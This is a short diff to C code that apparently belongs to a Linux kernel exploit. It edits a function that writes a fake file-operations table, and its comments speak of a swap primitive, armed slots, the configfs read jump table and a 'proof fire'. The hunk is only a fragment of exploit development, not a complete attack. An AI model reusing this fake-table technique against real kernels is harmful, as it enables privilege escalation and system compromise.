@@ -672,7 +672,9 @@ void put_fake_fops_table(unsigned char *p, size_t off) {
    * primitive (g_swap_staged). SS1/R2/W1 died to system reads hitting
    * the configfs read JT through the .read slot.
    */
-  int swap_stage1 = slide_swap_tbl;
+  /* Explicit CLONE_FOPS wins: pure semantic-no-op replica for the
+   * walk-stability proof fire (no armed slots at all). */
+  int swap_stage1 = slide_swap_tbl && !clone_fops;
   g_swap_staged = swap_stage1;
   if (clone_fops || clone_cfg || swap_stage1) {
     put64(p, off + FOPS_OWNER_OFF, 0);
